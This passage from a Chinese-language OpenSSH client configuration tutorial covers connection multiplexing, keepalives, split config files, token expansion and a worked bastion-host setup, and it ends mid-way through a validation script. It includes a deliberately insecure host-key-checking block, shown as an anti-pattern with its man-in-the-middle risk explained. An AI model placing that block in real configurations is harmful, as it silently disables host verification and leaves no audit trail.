#### ★★★ 為什麼 ControlPath 一定要用 `%C`

```bash
# ★★★ 錯誤示範：路徑太長
ssh -o 'ControlPath=/home/opsadmin/.ssh/controlmasters/%r@%h:%p-verylongsuffix...' -O check web01
```

預期輸出：

```text
ControlPath too long ('/home/opsadmin/.ssh/controlmasters/deploy@some.very.long.fqdn...' >= 108 bytes)
```

```
★★★★ 原因：ControlPath 是 UNIX domain socket，
      Linux 的 struct sockaddr_un.sun_path 硬性上限是 【108 bytes】（含結尾 \0）。
      用 %r@%h:%p 展開後，只要 FQDN 長一點、家目錄深一點就爆掉。

★★★ 解法：用 %C —— 它是 (%l 本機FQDN、%h 遠端主機、%p port、%r 遠端使用者、%j 跳板)
     這幾項的雜湊，永遠是固定長度的 40 個十六進位字元。

     ControlPath ~/.ssh/cm/%C
     → /home/opsadmin/.ssh/cm/870b88d70468db1aec77e680e51f07854ae36564
     ★★ %C 是 OpenSSH 6.7（2014）加入的，現在所有在用的版本都支援。
```

```bash
# ★★ 看實際展開結果
ssh -G web01 | grep '^controlpath'
```

```text
controlpath /home/opsadmin/.ssh/cm/870b88d70468db1aec77e680e51f07854ae36564
```

#### ★★★★ 最大的陷阱：舊 socket 讓新設定完全不生效

```
★★★★ 症狀（幾乎每個用 ControlPersist 的人都會遇到一次）

  你改了 ~/.ssh/config：
    - 換了 User
    - 換了 IdentityFile
    - 加了 LocalForward
    - 改了 Port

  $ ssh -G web01          → ★★ 顯示【新的】設定，看起來完全正確
  $ ssh web01             → ★★★★ 進去之後還是【舊的】行為

  原因：
    ControlPersist 10m 讓一個 master 在背景活著。
    你的新連線【根本沒有建立新連線】，它只是接上那個舊 socket ——
    ★★★★ 而那個 socket 是用【改設定之前的參數】建立的。
    User、Port、IdentityFile、ProxyJump 這些【建線期】的參數，
    在複用連線上完全無效。

  ★★★★ 除錯 SOP 的第一步永遠是：
    $ ssh -O exit web01
    Exit request sent.
    $ ssh web01           ← 現在才會用新設定重新建線

  ★★★ 如果別名也改了、或不確定有哪些 master：
    $ ls -l ~/.ssh/cm/
    srw-------  1 opsadmin opsadmin 0 Aug 28 09:20 870b88d7...
    srw-------  1 opsadmin opsadmin 0 Aug 28 09:31 46246e5e...
    $ rm -f ~/.ssh/cm/*        # ★★★ 暴力但有效（★★ 會讓現有工作階段失去 master）
```

```bash
# ★★★ 把「改完 config 就清 socket」變成習慣：加個 shell 函式到 ~/.bashrc
sshreload() {
    for s in ~/.ssh/cm/*; do
        [ -S "$s" ] || continue
        ssh -O exit -o "ControlPath=$s" dummy 2>/dev/null || rm -f "$s"
    done
    echo "★ 已清除所有 ControlMaster socket"
}
```

> [!tip] ControlMaster 與 scp / rsync / git ★★★
> ```
> ★★★ 只要走的是同一個 ssh 別名，這些工具全部自動吃到複用：
>
>   $ scp report.csv web01:/tmp/           # ★ 幾乎瞬間
>   $ rsync -avz ./dist/ web01:/var/www/   # ★★ 見 [[02-rsync-同步與備份]]
>   $ git push production main              # ★★ 走 ssh 的 git remote 也算
>
> ★★★ 對 Ansible 特別有感 —— 它每個 task 都開一次 ssh，
>     開了 ControlMaster 之後 playbook 執行時間常常砍半。
>
> ★★★★ 但也因此：Ansible 跑到一半你去 ssh -O exit，playbook 會整批失敗。
> ```

> [!danger] ControlPath 放錯位置會被劫持 ★★★★
> ```
> ★★★★ socket 檔案的意義是「誰能連上它，誰就能用你已認證的連線」。
>
>   ✗ ControlPath /tmp/ssh-%C            ← ★★★★ /tmp 是所有人可寫
>   ✗ ControlPath /dev/shm/%C            ← ★★★★ 同上
>   ✓ ControlPath ~/.ssh/cm/%C           ← ★★★ 家目錄，配 chmod 700
>   ✓ ControlPath /run/user/%i/ssh/%C    ← ★★★ 更好：tmpfs、開機清空、
>                                             ★★ 且天生只有該 uid 能進
>
> ★★★ 用 /run/user 的話記得先建目錄（★★ 或用 systemd tmpfiles）：
>   $ mkdir -p /run/user/$(id -u)/ssh
> ```

### 連線穩定性三兄弟

```
★★★★ 三個名字很像、層級完全不同的機制

  ┌────────────────────────┬──────────┬──────────────────────────────────┐
  │ 設定項                  │ 誰在數    │ 做什麼                            │
  ├────────────────────────┼──────────┼──────────────────────────────────┤
  │ ServerAliveInterval     │ ★★★★     │ 客戶端每 N 秒送一個【SSH 層】的     │
  │ ServerAliveCountMax     │ 你（客戶端）│ 加密探測封包給伺服器。連續 M 次沒  │
  │                        │          │ 回應就自己斷開並報錯。             │
  │  → 寫在 ~/.ssh/config  │          │ ★★★★ NAT／防火牆閒置斷線就是調它   │
  ├────────────────────────┼──────────┼──────────────────────────────────┤
  │ ClientAliveInterval     │ ★★       │ 伺服器端每 N 秒探測客戶端。         │
  │ ClientAliveCountMax     │ 對方（sshd）│ 主要目的是【清掉殭屍工作階段】，   │
  │  → 寫在 sshd_config    │          │ 不是為了幫你維持連線。             │
  │                        │          │ ★★★ 建議值見 [[04-sshd-伺服器端設定]] │
  ├────────────────────────┼──────────┼──────────────────────────────────┤
  │ TCPKeepAlive            │ ★★       │ 作業系統的 TCP 層 keepalive。      │
  │                        │ 核心      │ ★★★ Linux 預設【2 小時】才送第一個，│
  │  → 兩邊都有            │          │ 對「閒置 5 分鐘就斷」完全沒用。     │
  │                        │          │ ★★ 而且它不加密，中間設備看得到。   │
  └────────────────────────┴──────────┴──────────────────────────────────┘


★★★★ 「機關 NAT／防火牆閒置 5 分鐘斷線」該調哪一個？

  答：★★★★ 客戶端的 ServerAliveInterval。

  理由：
    ① 它是【你能控制的】—— 不用求伺服器管理員改設定
    ② 它送的是【SSH 層】封包 —— 中間的 NAT／狀態防火牆看到有流量，
       會重置閒置計時器（TCPKeepAlive 的 ACK 有些設備【不算】流量）
    ③ ★★★ 設 30 秒，遠小於 5 分鐘的閾值，很安全

  Host *
      ServerAliveInterval 30      # ★★★★ 每 30 秒探測
      ServerAliveCountMax 3       # ★★★ 連續 3 次沒回應（= 90 秒）才判定斷線
      TCPKeepAlive yes            # ★ 額外保險，成本很低
```

```bash
ssh -G web01 | grep -E 'alive'
```

預期輸出：

```text
serveralivecountmax 3
serveraliveinterval 30
tcpkeepalive yes
```

```
★★★ 調參數的取捨：
     · Interval 太小（< 10s）→ 沒有好處，只是多送封包
     · CountMax 太大（> 5）  → 線路真的斷了你要等很久才知道
     · ★★★ 真正長時間的工作（編譯、備份、大檔傳輸）不要靠 keepalive 硬撐，
       用 [[01-tmux-工作階段管理]] 把它放進 tmux —— 斷線了工作照跑。
```

### Include 與 config.d 分檔管理

```bash
mkdir -p ~/.ssh/config.d
chmod 700 ~/.ssh/config.d

cat > ~/.ssh/config <<'EOF'
# ★★★★ Include 放最上面，因為「第一個值勝出」，
#      被 include 進來的內容等於被貼在這個位置。
Include ~/.ssh/config.d/*.conf
EOF
chmod 600 ~/.ssh/config
```

```
★★★★ Include 的三個規則

  ① 展開順序 = 【glob 的字典序】
     10-bastion.conf → 20-prod.conf → 90-defaults.conf
     ★★★★ 所以檔名前綴的數字【就是優先序】，
           而且必須讓 Host * 的那份排最後（90- 或 99-）

  ② ★★★ 相對路徑的基準是 ~/.ssh/（從使用者設定檔 include 時），
     所以 `Include config.d/*.conf` 也可以，但寫全路徑比較不會誤會

  ③ ★★★ Include 可以寫在 Host / Match 區塊【裡面】做條件式載入：
       Match localuser deploy
           Include ~/.ssh/config.d/deploy-only/*.conf
```

```bash
# ★★★ 驗證 include 真的有生效、順序對不對
ssh -vvv -o ConnectTimeout=1 web01 true 2>&1 | grep -E 'Including file|Applying options'
```

預期輸出：

```text
debug3: /home/opsadmin/.ssh/config line 1: Including file /home/opsadmin/.ssh/config.d/10-bastion.conf depth 0
debug3: /home/opsadmin/.ssh/config line 1: Including file /home/opsadmin/.ssh/config.d/20-prod.conf depth 0
debug1: /home/opsadmin/.ssh/config.d/20-prod.conf line 1: Applying options for web01
debug3: /home/opsadmin/.ssh/config line 1: Including file /home/opsadmin/.ssh/config.d/90-defaults.conf depth 0
debug1: /home/opsadmin/.ssh/config.d/90-defaults.conf line 1: Applying options for *
```

#### ★★★★ 哪些內容不能進公開 repo

把主機清單版控起來是好事（[[02-Git-基本工作流程]]），但要先想清楚外洩後果：

| 內容 | 可以進內部 repo？ | 可以進公開 repo？ | 理由 |
| --- | --- | --- | --- |
| 內網 IP（10.x / 192.168.x） ★★ | ✅ | ❌ | 洩漏內網拓撲，是滲透的第一步 |
| **跳板機外網 IP／FQDN** ★★★★ | ✅ | **❌ 絕對不行** | 等於公告「打這台就能進內網」 |
| 非標準 SSH port ★★★ | ✅ | ❌ | 讓「改 port」這道防線失效 |
| 帳號名稱（deploy、opsadmin） ★★★ | ✅ | ❌ | 有效帳號名＝暴力破解成功一半 |
| 別名（web01、db01） ★ | ✅ | ⚠️ | 本身低敏感，但配合其他資訊有價值 |
| `IdentityFile` **路徑** ★★ | ✅ | ⚠️ | 路徑不是金鑰，但透露命名規則 |
| **私鑰本身** ★★★★★ | ❌ | ❌ | **不解釋。這是資安事件。** |
| `ProxyCommand` 裡的密碼 ★★★★★ | ❌ | ❌ | 明文憑證 |

```
★★★★ 實務分法（機關內部 GitLab）

  ~/.ssh/config.d/
    ├─ 10-bastion.conf   ← ★★★ 內部 repo。跳板機資訊，限維運群組可讀
    ├─ 20-prod.conf      ← ★★★ 內部 repo。正式機清單，這是【資產清冊】
    ├─ 30-stg.conf       ← ★★ 內部 repo
    ├─ 80-local.conf     ← ★★★★ 【不進 repo】。個人金鑰路徑、個人偏好
    └─ 90-defaults.conf  ← ★★★ 內部 repo。Host * 共用設定

  .gitignore:
    80-local.conf
    *.bak
    *.local.conf

  ★★★★ 判斷準則：「這份檔案外流到網路上，我要不要通報資安事件？」
        會 → 不進 repo，或至少是私有 repo + 存取控制。
```

### Token 替換一覽

| Token | 展開為 | 常用在 | 星級 |
| --- | --- | --- | --- |
| `%h` | **HostName**（解析後的） | `ProxyCommand`、`ControlPath` | ★★★ |
| `%n` | **originalhost**（你打的別名） | `LocalCommand`、日誌 | ★★ |
| `%p` | Port | `ProxyCommand ssh -W %h:%p` | ★★★ |
| `%r` | 遠端使用者 | `ControlPath` | ★★ |
| `%u` | **本機**使用者 | `IdentityFile ~/keys/%u` | ★★ |
| `%C` | `%l%h%p%r%j` 的雜湊（40 hex） | **`ControlPath` 首選** | ★★★★ |
| `%d` | 本機家目錄 | `IdentityFile %d/.ssh/x` | ★★ |
| `%i` | 本機 UID | `ControlPath /run/user/%i/ssh/%C` | ★★★ |
| `%j` | ProxyJump 的內容 | 除錯用 | ★ |
| `%L` / `%l` | 本機主機名（短／FQDN） | 多台工作站共用 config | ★★ |

```bash
# ★★★ 實用組合一：一台工作站多個身分
Host *.gov.tw
    IdentityFile ~/.ssh/keys/%u-gov       # ★★ 依【本機登入者】換金鑰

# ★★★ 實用組合二：socket 放 tmpfs
Host *
    ControlPath /run/user/%i/ssh/%C       # ★★★ 開機自動清空，不留殘骸

# ★★ 實用組合三：舊版跳板寫法
Host web01
    ProxyCommand ssh -W %h:%p bastion     # ★★ %h→10.10.20.11、%p→22
```

```
★★★★ %h 與 %n 的差別是考題也是實務陷阱：

  Host web01
      HostName 10.10.20.11
      ProxyCommand ssh -W %h:%p bastion    ← ★★★★ %h = 10.10.20.11（對）
      ProxyCommand ssh -W %n:%p bastion    ← ★★★★ %n = web01（★★★ 跳板機上
                                                查不到這個名字，連線失敗）
  ★★★ 除非跳板機的 /etc/hosts 或內部 DNS 認得 web01，否則一律用 %h。
```

### ★★★★ 反面教材：`StrictHostKeyChecking no`

```
★★★★★ 這組設定是本篇唯一明確標示【正式環境禁止】的東西

  Host *
      StrictHostKeyChecking no          ← ★★★★ 不驗證主機金鑰
      UserKnownHostsFile /dev/null      ← ★★★★ 驗證結果丟掉，不留紀錄
      LogLevel ERROR                    ← ★★★ 連警告都不給你看

  ★★★ 為什麼有人會這樣寫？
    因為每次重灌測試機都要手動確認指紋，很煩。
    ★★★★ 但這等於把 [[01-SSH-原理與第一次連線]] 建立的整個主機驗證機制丟掉。

  ★★★★★ 實際後果：
    ┌────────┐        ┌──────────────┐        ┌────────┐
    │  你     │───────▶│  攻擊者       │───────▶│ web01  │
    │        │◀───────│（ARP 欺騙／   │◀───────│        │
    └────────┘        │  DNS 劫持）    │        └────────┘
                      └──────────────┘
                       ★★★★★ 他冒充 web01 的主機金鑰，
                       你的 ssh 【一聲不吭】接受，
                       你輸入的一切（sudo 密碼、DB 密碼、
                       agent 轉發的簽章請求）他全部看到。

    ★★★★ 而且因為 known_hosts 指到 /dev/null，
          事後【連查都查不出來曾經被中間人接手過】—— 稽核軌跡歸零。
```

```bash
# ★★★★ 正確的替代方案
Host *
    StrictHostKeyChecking accept-new     # ★★★★ OpenSSH 7.6+（2017）
    UserKnownHostsFile ~/.ssh/known_hosts
```

| 值 | 行為 | 適用 | 星級 |
| --- | --- | --- | --- |
| `ask` | 沒看過的問你，變更的**拒絕** | **預設值，最安全** | ★★★★ |
| `accept-new` | 沒看過的**自動接受**，變更的**仍然拒絕** | **★★★★ 自動化與大量新機的正解** | ★★★★ |
| `no` / `off` | 沒看過的接受，**變更的也接受**（只警告） | **★★★★ 正式環境禁止** | ★★★★★ |
| `yes` | **一律拒絕**沒在 known_hosts 裡的 | 極高安全需求，需事先佈署 known_hosts | ★★★ |

```
★★★★ accept-new 為什麼安全得多？

  真正的攻擊場景是「一台你【已經連過】的機器，金鑰突然變了」。
    · accept-new → ★★★★ 拒絕連線並跳出巨大警告（跟 ask 一樣）
    · no         → ★★★★★ 靜靜地接受，你完全不知情

  ★★★ 第一次連線的風險（TOFU, Trust On First Use）確實還在，
      要消除它就得【事前佈署 known_hosts】：

  # ★★★ 從已知可信來源產生（★★★★ 不要用 ssh-keyscan 去掃你不信任的網路）
  $ ssh-keyscan -t ed25519 -p 2222 10.10.20.11 >> ~/.ssh/known_hosts
  # 10.10.20.11:2222 SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13
  ★★★★ 這只在「你確定當下網路沒有被中間人」時才有意義 ——
        真正嚴謹的做法是用 SSH 憑證（@cert-authority），見 [[07-SSH-安全強化]]。
```

```
★★ 唯一可以接受 StrictHostKeyChecking no 的場景（要三個條件同時成立）：

  ① 拋棄式的測試機（Vagrant / 本機 VM / CI runner 裡的容器）
  ② ★★★ 且限定在【專用的 Host 區塊】，不是 Host *
  ③ ★★★ 且 UserKnownHostsFile 指到專用檔案，不是 /dev/null

  Host vagrant-* 192.168.56.*
      StrictHostKeyChecking no
      UserKnownHostsFile ~/.ssh/known_hosts_throwaway    # ★★★ 至少留得下紀錄
      LogLevel ERROR
```

### 客戶端平台差異

| 平台 | config 位置 | 讀這份檔嗎 | 星級 |
| --- | --- | --- | --- |
| Linux / macOS | `~/.ssh/config` | ✅ | ★★★ |
| **Windows 內建 OpenSSH** | `C:\Users\<你>\.ssh\config` | ✅ | ★★★ |
| **WSL** | `/home/<你>/.ssh/config`（Linux 側） | ✅ **★★★★ 但跟 Windows 那份完全不共用** | ★★★★ |
| Git for Windows（MSYS2） | `C:\Users\<你>\.ssh\config` | ✅ 通常共用 Windows 那份 | ★★ |
| **PuTTY / KiTTY** | 註冊表的 Session | ❌ **完全不吃這份檔** | ★★★ |
| **VS Code Remote-SSH** | 讀 `~/.ssh/config` | ✅ **★★★ 就是同一份** | ★★★ |
| WinSCP | 自己的設定，但可**匯入** PuTTY session | ❌ | ★★ |
| MobaXterm | 自己的設定，可讀 OpenSSH config | ⚠️ | ★ |

```powershell
# Windows：確認內建 OpenSSH 版本與 config 路徑
ssh -V
Get-Item "$env:USERPROFILE\.ssh\config" | Format-List FullName, Length

# ★★★ Windows 上的權限修法（沒有 chmod，改用 icacls）
icacls "$env:USERPROFILE\.ssh\config" /inheritance:r
icacls "$env:USERPROFILE\.ssh\config" /grant:r "$env:USERNAME:(F)"
```

Windows 預期輸出：

```text
OpenSSH_for_Windows_9.5p1, LibreSSL 3.8.2

FullName : C:\Users\opsadmin\.ssh\config
Length   : 1024
```

```
★★★★ WSL 使用者最常踩的坑：
      「我在 Windows Terminal 用 ssh web01 可以，在 WSL 裡不行」
      → ★★★★ 兩個是【完全獨立】的 OpenSSH 與 config，各自維護。

  ★★ 解法一（推薦）：兩邊各放一份，用同一個內部 repo 同步 config.d
  ★★ 解法二：WSL 裡做符號連結指到 Windows 的（★★★ 但金鑰權限會因為
     drvfs 的 metadata 問題被 ssh 拒絕，要在 /etc/wsl.conf 設 metadata 選項，
     ★★★ 實務上不如各放一份單純）
```

```
★★★ VS Code Remote-SSH 與這份檔的關係：
     它【就是】呼叫你系統的 ssh，讀的【就是】這份 ~/.ssh/config。
     所以：
       · 你在 config 裡設好 ProxyJump → VS Code 自動就能連進內網
       · 你的 ControlMaster 舊 socket 沒清 → VS Code 也會連到舊設定
       · ★★★ 你的 config 有語法錯誤 → VS Code 會顯示很難懂的錯誤訊息，
         ★★★★ 這時先回到終端機跑 `ssh -G <別名>`，錯誤訊息清楚得多
     安裝、設定與埠轉發細節見 [[04-遠端編輯與VSCode-Remote]]。
```

### 其他值得寫進 config 的項目

```bash
# ★★ 每次連上就自動開一條轉發（語法與情境見 [[05-SSH-隧道與埠轉發]]）
Host db01
    HostName 10.10.30.21
    ProxyJump bastion
    LocalForward 13306 127.0.0.1:3306      # ★★ 本機 13306 → db01 的 MySQL

# ★★ 連上就直接進 tmux（★★★ 見 [[01-tmux-工作階段管理]]）
Host web01
    RemoteCommand tmux new-session -A -s ops
    RequestTTY force                        # ★★★ 沒有這行 tmux 會抱怨沒有 TTY

# ★★ 傳環境變數過去（★★★ 伺服器端 sshd_config 要有對應的 AcceptEnv）
Host *.gov.tw
    SetEnv LANG=zh_TW.UTF-8 DEPLOY_BY=ops-team

# ★★★ 同一台機器有內外兩個位址，避免 known_hosts 重複驗證
Host web01 web01-ext
    HostKeyAlias web01-hostkey

# ★ 連老舊設備（IPMI、KVM、舊交換器）
Host ipmi-*
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    KexAlgorithms +diffie-hellman-group14-sha1
    # ★★★★ 這是【降級】，只寫在這個 Host 區塊，絕不要寫進 Host *
```

---

## 完整實戰範例

### 情境

某機關資訊室要把「SSH 連線方式」標準化並交接給新進同仁。網路分三段：

```
★★★ 目標架構

  ┌─────────────┐
  │  維運人員筆電 │  ★★★★ 私鑰只存在這裡
  │  (辦公網段)   │
  └──────┬──────┘
         │ SSH 22022
         ▼
  ┌────────────────────────────┐
  │ DMZ：bastion               │  203.0.113.10:22022
  │ ★★★★ 唯一對外開放的機器      │  帳號 opsadmin
  │ ★★★ 只做轉發，不裝任何服務   │
  └──────┬─────────────────────┘
         │ 內部路由
    ┌────┴────┬──────────────┬─────────────┐
    ▼         ▼              ▼             ▼
 10.10.20.11  10.10.20.12   10.10.30.21   10.10.40.5
   web01        web02          db01          mon01
   :2222        :2222          :22           :22
   deploy       deploy         dbadmin       monitor
   （前台）     （前台）       （MySQL）     （Zabbix）
```

### 步驟一：建立目錄骨架

```bash
mkdir -p ~/.ssh/config.d ~/.ssh/cm
chmod 700 ~/.ssh ~/.ssh/config.d ~/.ssh/cm

cat > ~/.ssh/config <<'EOF'
# =====================================================================
#  SSH 客戶端主設定  —  資訊室維運標準組態
#  ★★★★ 這個檔案本身只做一件事：include config.d
#  ★★★★ 所有設定都在 config.d/ 裡，檔名數字前綴 = 套用優先序（小的先）
#  維護：資訊室維運組    最後更新：2026-08-28
# =====================================================================
Include ~/.ssh/config.d/*.conf
EOF
chmod 600 ~/.ssh/config
```

### 步驟二：`10-bastion.conf`（跳板機）

```bash
cat > ~/.ssh/config.d/10-bastion.conf <<'EOF'
# ---------------------------------------------------------------------
# 10-bastion.conf — DMZ 跳板機
# ★★★★ 這個檔案含【對外 IP 與非標準 port】，僅限內部 repo
# ---------------------------------------------------------------------
Host bastion bastion.dmz
    HostName        203.0.113.10
    User            opsadmin
    Port            22022
    IdentityFile    ~/.ssh/id_ed25519_bastion
    IdentitiesOnly  yes
    ForwardAgent    no                # ★★★★ 跳板機是最不該轉發 agent 的地方
    # ★★★ 跳板機通常連線數多、閒置久，探測間隔短一點
    ServerAliveInterval 20
    ServerAliveCountMax 3
EOF
chmod 600 ~/.ssh/config.d/10-bastion.conf
```

### 步驟三：`20-prod.conf`（正式環境）

```bash
cat > ~/.ssh/config.d/20-prod.conf <<'EOF'
# ---------------------------------------------------------------------
# 20-prod.conf — 正式環境主機清單（★★★ 這就是資產清冊，異動要 code review）
# ★★★★ 每一台都經 bastion，本機不需要對內網有路由
# ---------------------------------------------------------------------

# ---- 前台 Web ----
Host web01
    HostName        10.10.20.11
    User            deploy
    Port            2222
    ProxyJump       bastion

Host web02
    HostName        10.10.20.12
    User            deploy
    Port            2222
    ProxyJump       bastion

# ---- 資料庫 ----
Host db01
    HostName        10.10.30.21
    User            dbadmin
    ProxyJump       bastion
    # ★★★ 連上就把 MySQL 轉到本機 13306，DBeaver 直接接 127.0.0.1:13306
    LocalForward    13306 127.0.0.1:3306

# ---- 監控 ----
Host mon01
    HostName        10.10.40.5
    User            monitor
    ProxyJump       bastion
    LocalForward    18080 127.0.0.1:8080

# ---- 正式環境共用（★★★ 放在具體主機【之後】、Host * 【之前】）----
Host web0? db0? mon0?
    IdentityFile    ~/.ssh/id_ed25519_prod
    IdentitiesOnly  yes
    ForwardAgent    no                # ★★★★ 正式機一律不轉發 agent
    LogLevel        INFO
EOF
chmod 600 ~/.ssh/config.d/20-prod.conf
```

### 步驟四：`80-local.conf`（**不進 repo**）

```bash
cat > ~/.ssh/config.d/80-local.conf <<'EOF'
# ---------------------------------------------------------------------
# 80-local.conf — 個人本機設定
# ★★★★ 這個檔案【不進 repo】（.gitignore 已排除）
# 個人金鑰路徑、個人偏好放這裡；如果你把金鑰放在非標準位置，也覆寫在這
# ★★★ 注意：因為「第一個值勝出」，這裡【無法覆寫】前面 20-prod.conf
#     已經設過的參數 —— 要覆寫請改檔名為 05-local.conf
# ---------------------------------------------------------------------
Host *
    AddKeysToAgent  yes
EOF
chmod 600 ~/.ssh/config.d/80-local.conf
```

### 步驟五：`90-defaults.conf`（★★★★ 共用設定，必須最後）

```bash
cat > ~/.ssh/config.d/90-defaults.conf <<'EOF'
# ---------------------------------------------------------------------
# 90-defaults.conf — 全域預設
# ★★★★★ 這個檔案【必須是字典序最後一個】。
#        因為 ssh_config 是「第一個值勝出」，Host * 一旦排在前面，
#        底下每一個參數都會鎖死，所有具體主機的設定通通失效。
#        ★★★★ 新增檔案時前綴不要超過 90。
# ---------------------------------------------------------------------
Host *
    # --- 主機金鑰驗證（★★★★ 絕不設成 no）---
    StrictHostKeyChecking   accept-new
    UserKnownHostsFile      ~/.ssh/known_hosts
    HashKnownHosts          yes

    # --- 認證 ---
    AddKeysToAgent          yes
    ForwardAgent            no          # ★★★★ 預設關閉，要用才個別開
    ForwardX11              no
    PubkeyAuthentication    yes

    # --- 連線穩定（★★★★ 機關 NAT 閒置 5 分鐘會斷，靠這個撐住）---
    ServerAliveInterval     30
    ServerAliveCountMax     3
    TCPKeepAlive            yes
    ConnectTimeout          10

    # --- 連線複用（★★★ 改完 config 記得 ssh -O exit）---
    ControlMaster           auto
    ControlPath             ~/.ssh/cm/%C
    ControlPersist          10m
EOF
chmod 600 ~/.ssh/config.d/90-defaults.conf
```

### 步驟六：驗證

```bash
ssh -G web01 | awk '$1 ~ /^(hostname|user|port|proxyjump|identityfile|controlpath|stricthostkeychecking|serveraliveinterval)$/'
```

預期輸出：

```text
user deploy
hostname 10.10.20.11
port 2222
stricthostkeychecking accept-new
serveraliveinterval 30
controlpath /home/opsadmin/.ssh/cm/870b88d70468db1aec77e680e51f07854ae36564
identityfile ~/.ssh/id_ed25519_prod
proxyjump bastion
```

### ★★★★ 驗證腳本 `/usr/local/bin/ssh-config-check`

```bash
sudo tee /usr/local/bin/ssh-config-check >/dev/null <<'SCRIPT'
#!/usr/bin/env bash
#
# ssh-config-check — 驗證 ~/.ssh/config 的每個別名是否解析成預期值，並實測連通
#
#   用法：ssh-config-check [-e 期望值檔] [-n]      -n = 只驗設定不連線
#   期望值檔格式（每行一台，欄位以空白分隔，# 為註解）：
#       別名  hostname          user     port  proxyjump
#       web01 10.10.20.11       deploy   2222  bastion
#       db01  10.10.30.21       dbadmin  22    bastion
#       bastion 203.0.113.10    opsadmin 22022 -
#
# 離開碼：0 全通過 / 1 設定不符 / 2 連線失敗 / 3 環境問題
#
set -euo pipefail

EXPECT_FILE="${HOME}/.ssh/expected-hosts.txt"
DO_CONNECT=1
FAIL_CONF=0
FAIL_CONN=0
CONNECT_TIMEOUT=5

RED=$'\033[31m'; GRN=$'\033[32m'; YEL=$'\033[33m'; RST=$'\033[0m'

die()  { printf '%s[FATAL]%s %s\n' "$RED" "$RST" "$*" >&2; exit 3; }
ok()   { printf '  %s✓%s %s\n' "$GRN" "$RST" "$*"; }
bad()  { printf '  %s✗%s %s\n' "$RED" "$RST" "$*"; }
warn() { printf '  %s!%s %s\n'  "$YEL" "$RST" "$*"; }
head1(){ printf '\n=== %s ===\n' "$*"; }

while getopts ':e:nh' opt; do
    case "$opt" in
        e) EXPECT_FILE="$OPTARG" ;;
        n) DO_CONNECT=0 ;;
        h) sed -n '2,14p' "$0"; exit 0 ;;
        *) die "未知選項 -$OPTARG" ;;
    esac
done

# --- 【0】前置檢查 --------------------------------------------------
head1 "0. 環境與權限"

command -v ssh >/dev/null || die "找不到 ssh"
ok "ssh $(ssh -V 2>&1)"

[[ -f "$HOME/.ssh/config" ]] || die "找不到 $HOME/.ssh/config"

# ★★★★ 權限：group/other 不可寫，否則 ssh 直接拒絕使用整份 config
perm=$(stat -c '%a' "$HOME/.ssh/config")
owner=$(stat -c '%U' "$HOME/.ssh/config")
if [[ "$owner" != "$(id -un)" ]]; then
    bad "config 擁有者是 $owner，不是 $(id -un) → ssh 會回 'Bad owner or permissions'"
    printf '      修法：sudo chown %s:%s %s/.ssh/config\n' "$(id -un)" "$(id -gn)" "$HOME"
    FAIL_CONF=1
elif [[ "$perm" != "600" && "$perm" != "400" && "$perm" != "644" ]]; then
    bad "config 權限 $perm 不安全 → 修法：chmod 600 $HOME/.ssh/config"
    FAIL_CONF=1
else
    ok "config 權限 $perm、擁有者 $owner"
fi

# ★★★★ 語法檢查：客戶端的 sshd -t 等價物
if ! ssh -G __syntax_probe__ >/dev/null 2>/tmp/sshcheck.$$; then
    bad "設定檔語法錯誤："
    sed 's/^/      /' /tmp/sshcheck.$$
    rm -f /tmp/sshcheck.$$
    exit 1
fi
rm -f /tmp/sshcheck.$$
ok "設定檔語法通過（ssh -G 完整解析成功）"

# ★★★★ Host * 是否排在最前面（本篇最大的坑）
first_star=$(ssh -vvv -o ConnectTimeout=1 __probe__ true 2>&1 \
             | grep -n 'Applying options for \*' | head -1 | cut -d: -f1 || true)
first_any=$(ssh -vvv -o ConnectTimeout=1 __probe__ true 2>&1 \
             | grep -n 'Applying options for' | head -1 | cut -d: -f1 || true)
if [[ -n "$first_star" && -n "$first_any" && "$first_star" == "$first_any" ]]; then
    warn "第一個套用的區塊就是 Host *（若它設了 User/IdentityFile 會鎖死所有主機）"
fi

# ★★★ ControlMaster socket 殘骸
if compgen -G "$HOME/.ssh/cm/*" >/dev/null 2>&1; then
    n=$(find "$HOME/.ssh/cm" -type s | wc -l)
    warn "有 $n 個 ControlMaster socket 存活 —— 若剛改過 config，先跑 ssh -O exit <別名>"
fi

# --- 【1】期望值比對 ------------------------------------------------
head1 "1. 設定解析比對（ssh -G）"

[[ -f "$EXPECT_FILE" ]] || die "找不到期望值檔 $EXPECT_FILE（用 -e 指定）"

while read -r alias exp_host exp_user exp_port exp_jump; do
    [[ -z "${alias:-}" || "$alias" == \#* ]] && continue

    got=$(ssh -G "$alias" 2>/dev/null) || { bad "$alias：ssh -G 失敗"; FAIL_CONF=1; continue; }
    g_host=$(awk '$1=="hostname"{print $2; exit}'  <<<"$got")
    g_user=$(awk '$1=="user"{print $2; exit}'      <<<"$got")
    g_port=$(awk '$1=="port"{print $2; exit}'      <<<"$got")
    g_jump=$(awk '$1=="proxyjump"{print $2; exit}' <<<"$got")
    g_jump="${g_jump:--}"

    # ★★★★ hostname == alias 代表沒有任何 Host 區塊匹配到（通常是別名打錯）
    if [[ "$g_host" == "$alias" && "$exp_host" != "$alias" ]]; then
        bad "$alias：hostname 竟等於別名本身 → 沒有任何 Host 區塊匹配（拼字或大小寫錯）"
        FAIL_CONF=1; continue
    fi

    diffs=()
    [[ "$g_host" == "$exp_host" ]] || diffs+=("hostname: 期望 $exp_host 實得 $g_host")
    [[ "$g_user" == "$exp_user" ]] || diffs+=("user: 期望 $exp_user 實得 $g_user")
    [[ "$g_port" == "$exp_port" ]] || diffs+=("port: 期望 $exp_port 實得 $g_port")
    [[ "$g_jump" == "$exp_jump" ]] || diffs+=("proxyjump: 期望 $exp_jump 實得 $g_jump")

    if ((${#diffs[@]} == 0)); then
        ok "$alias → $g_user@$g_host:$g_port (jump=$g_jump)"
    else
        bad "$alias 設定不符："
        printf '      %s\n' "${diffs[@]}"
        # ★★★ 指出最可能的原因
        printf '      提示：跑 ssh -vvv %s true 2>&1 | grep "Applying options"\n' "$alias"
        printf '            看哪個區塊【先】被套用 —— 第一個值勝出。\n'
        FAIL_CONF=1
    fi
done < "$EXPECT_FILE"

# --- 【2】實際連通測試 ----------------------------------------------
if (( DO_CONNECT )); then
    head1 "2. 連通測試（BatchMode，不會互動、不會問密碼）"
    while read -r alias _rest; do
        [[ -z "${alias:-}" || "$alias" == \#* ]] && continue
        if out=$(ssh -o BatchMode=yes \
                     -o ConnectTimeout="$CONNECT_TIMEOUT" \
                     -o StrictHostKeyChecking=accept-new \
